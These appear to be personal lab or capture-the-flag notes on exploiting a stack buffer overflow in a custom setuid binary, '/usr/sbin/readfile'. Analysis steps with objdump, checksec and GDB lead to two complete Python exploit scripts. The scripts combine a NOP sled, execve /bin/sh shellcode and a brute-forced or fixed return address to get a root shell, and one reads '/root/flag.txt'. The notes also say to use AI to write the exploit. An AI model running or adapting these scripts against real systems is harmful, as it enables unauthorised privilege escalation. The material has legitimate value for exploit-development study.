
If there is an custom binary, we can download the binary onto our local machine & analyze it.

1. Check Filetype & analyze if it's encrypted or uncompressed,

For easy reverse engineering

```
file /usr/sbin/readfiles
```

Downloaded it to local machine.

2. Check Security Features

Good if == 0

```
cat /proc/sys/kernel/randomize_va_space
```

On local machine

```
checksec readfiles
```

List all symbols

```
nm readfile 2>/dev/null
```

Show dynamic symbols

```
readelf --dyn-syms readfile
```

Show imported functions

```
objdump -T readfile
```

Show all sections

```
readelf -S readfile
```

Full disassembly

```
objdump -d readfile -M intel > readfile.disasm
```

Only main function with source if available

```
objdump -S readfile --disassemble=main
```

Show assembly with source interleaving

```
objdump -d -S readfile
```

3. Analyze the Source

```
- Does it allocate bytes on a stack? e.G with dest[80]
- Uses it strcpy() without bounds checking
- Does it run with elevated privs? setresuid(0,0,0)
```

```
objdump -d readfile -M intel | grep -E "(strcpy|strcat|gets|sprintf|scanf)"
```

4. Find the Offset

```
- 80 bytes for dest[]
- 8 bytes for saved RBP
- 88 bytes to reach RIP
```

Load in GDB to find extact offset

```
gdb -q readfiles
```

Goal is to find exact buffer location  0x50 = 80 bytes

```
(gdb) p/d 0x50
```

5. Test Offset with GDB (GNU Debugger)

```
gdb -q --args /usr/sbin/readfile $(python3 -c 'print("A"*88+"B"*8)')
run
```

This should crash with:

- RBP = 0x4141414141414141 (AAAAAAA)
- RIP pointing to 0x4242424242424242 (BBBBBBB)

6. Create Exploit

Utilize AI for this:

```
#!/usr/bin/env python3
import struct
import subprocess
import time
import sys

# Shellcode to spawn /bin/sh (24 bytes)
shellcode = b"\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05"

# Return address range to brute force
# Start from the address we saw in GDB
start_addr = 0x7fffffffe000
end_addr = 0x7ffffffff000

# The path to the vulnerable binary
binary = b"/usr/sbin/readfile"

print("[+] Starting brute force...")
print(f"[+] Range: {hex(start_addr)} - {hex(end_addr)}")
print(f"[+] Shellcode size: {len(shellcode)} bytes")

success_count = 0

for ret_addr in range(start_addr, end_addr, 8):
    # Pack the return address (only 6 bytes for x86-64)
    ret_bytes = struct.pack("<Q", ret_addr)[:6]
    
    # Skip addresses with null bytes
    if b"\x00" in ret_bytes:
        continue
    
    # Build the payload - try different NOP lengths for better success
    nop_count = 40
    payload = b"\x90" * nop_count
    payload += shellcode
    payload += b"A" * (88 - len(payload))
    payload += ret_bytes
    
    # Skip payloads with null bytes
    if b"\x00" in payload:
        continue
    
    # Print progress every 1000 attempts
    if (ret_addr - start_addr) % 8000 == 0:
        print(f"[+] Progress: {hex(ret_addr)}")
    
    # Execute the binary with the payload
    try:
        # First try: just run it and check output
        result = subprocess.run(
            [binary, payload],
            env={},
            timeout=1,
            capture_output=True
        )
        
        # If we got any output, try to interact with the shell
        if result.stdout or result.stderr:
            # Second try: attempt to get shell interaction
            try:
                proc = subprocess.Popen(
                    [binary, payload],
                    stdin=subprocess.PIPE,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    env={}
                )
                
                # Send commands to check if we're root
                commands = b"id\nwhoami\necho 'SHELL_TEST'\ncat /root/flag.txt\nexit\n"
                out, err = proc.communicate(commands, timeout=2)
                
                # Check for success indicators
                if b"uid=0" in out or b"root" in out or b"# " in out:
                    print("\n" + "="*60)
                    print("[+] SUCCESS! Got root shell!")
                    print("="*60)
                    print("[+] Output:")
                    print(out.decode('utf-8', errors='ignore'))
                    
                    # Try to spawn an interactive shell
                    print("\n[+] Attempting to spawn interactive shell...")
                    try:
                        proc2 = subprocess.Popen(
                            [binary, payload],
                            stdin=sys.stdin,
                            stdout=sys.stdout,
                            stderr=sys.stderr,
                            env={}
                        )
                        proc2.wait()
                    except:
                        pass
                    
                    sys.exit(0)
                    
                elif b"SHELL_TEST" in out:
                    print(f"[+] Found potential shell at {hex(ret_addr)} but not root yet")
                    success_count += 1
                    
            except subprocess.TimeoutExpired:
                # If it hangs, we might have a shell
                print(f"[+] Possible shell at {hex(ret_addr)} (timeout)")
                proc.kill()
                continue
                
    except Exception as e:
        # Silent fail for most errors
        continue

print("\n[-] Exploit failed - tried all addresses")
print(f"[+] Found {success_count} potential shells but none were root")
```

OR do it manually, but will study this topic later on:

---
### 6. Pattern Creation

Install pattern tools if needed

```
Using msf-pattern or pattern_create.rb
```

Create pattern of 100 bytes

```
python3 -c "print('A'*88 + 'BBBBBBBB')" > pattern.txt
```
Or use msf-pattern

```
msf-pattern_create -l 100
```
### 7. Crash Testing in GDB

```
gdb -q readfile
```

Run with pattern

```
(gdb) run $(python3 -c "print('A'*88 + 'BBBBBBBB')")
```

Check registers on crash

```
(gdb) info registers
(gdb) x/20gx $rsp
(gdb) bt full
```

**Expected crash:**

text

Program received signal SIGSEGV
RIP: 0x4242424242424242  # B's in RIP
RBP: 0x4141414141414141  # A's in RBP

### 8. Verify Exact Offset

Use cyclic pattern to find exact offset

```
gdb -q readfile
(gdb) pattern_create 100
```

Copy the pattern output

```
(gdb) run $(python3 -c "print('PATTERN_HERE')")
(gdb) pattern_offset $rsp
```

## Phase 3: Exploit Development

### 9. Check ASLR Status

On target machine

```
cat /proc/sys/kernel/randomize_va_space
```

0 = disabled, 2 = enabled

### 10. Prepare Shellcode

Generate shellcode (24 bytes for /bin/sh)

```
msfvenom -p linux/x64/exec CMD='/bin/sh' -f python -b '\x00'
```

Or use standard shellcode

```
\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05
```

### 11. Find Stack Address

```
gdb -q readfile
```

Set breakpoint at return

```
(gdb) break *main+143
(gdb) run $(python3 -c "print('A'*88)")
(gdb) info registers rsp
```

Record the address (e.g., 0x7fffffffe360)
### 12. Build Exploit Script

python

```
#!/usr/bin/env python3
import struct
import subprocess
import sys
def create_exploit(ret_addr, nop_sled=40):
    # 24-byte /bin/sh shellcode
    shellcode = b"\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05"
    
    # Return address (6 bytes for x86-64)
    ret_bytes = struct.pack("<Q", ret_addr)[:6]
    
    # Build payload
    payload = b"\x90" * nop_sled
    payload += shellcode
    payload += b"A" * (88 - len(payload))
    payload += ret_bytes
    
    return payload
def test_exploit(payload):
    try:
        proc = subprocess.Popen(
            ["./readfile", payload],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )
        out, err = proc.communicate(b"id\nwhoami\nexit\n", timeout=2)
        return out, err, proc.returncode
    except:
        return None, None, None
# Main exploit
if __name__ == "__main__":
    # Try different addresses
    addresses = [
        0x7fffffffe360,  # From GDB
        0x7fffffffe370,  # +16 bytes
        0x7fffffffe350,  # -16 bytes
    ]
    
    for addr in addresses:
        print(f"[+] Trying address: {hex(addr)}")
        payload = create_exploit(addr)
        
        out, err, code = test_exploit(payload)
        
        if out and b"uid=0" in out:
            print("[+] SUCCESS! Got root!")
            print(out.decode())
            
            # Spawn interactive shell
            proc = subprocess.Popen(
                ["./readfile", payload],
                stdin=sys.stdin,
                stdout=sys.stdout,
                stderr=sys.stderr
            )
            proc.wait()
            break

### 13. Test Locally First

bash

# Make script executable
chmod +x exploit.py
# Run it
python3 exploit.py
# If it works locally, test on remote
```
